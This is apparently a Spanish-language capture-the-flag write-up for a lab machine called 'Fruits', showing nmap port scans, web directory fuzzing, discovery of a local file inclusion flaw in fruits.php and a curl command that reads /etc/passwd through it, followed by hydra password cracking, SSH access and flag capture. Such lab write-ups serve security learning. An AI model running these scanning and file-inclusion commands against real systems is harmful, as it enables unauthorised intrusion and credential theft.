# Máquina Fruits
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.187

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.187

![alt text](image-2.png)

### Fuzzing Web

feroxbuster --url http://192.168.5.187/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![alt text](image-3.png)

entramos en la web:

![alt text](image-4.png)

ingresamos el 1 para verificar

![alt text](image-5.png)

me hace pensar que puede tratarse un LFI

### Explotación

Busqué otros archivos php

wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -z list,php 'http://192.168.5.187/FUZZ.FUZ2Z' 

![alt text](image-7.png)

Busqué el parámetro vulnerable:

wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://192.168.5.187/fruits.php?FUZZ=/etc/passwd" --hl=1

![alt text](image-6.png)

veo los usuarios:

curl http://192.168.5.187/fruits.php?file=/etc/passwd

![alt text](image-8.png)

hice cracking con hydra

![alt text](image-9.png)

### Escalar privilegios

ingreso por ssh:

![alt text](image-10.png)

### user.txt

![alt text](image-11.png)

### root.txt

![alt text](image-12.png)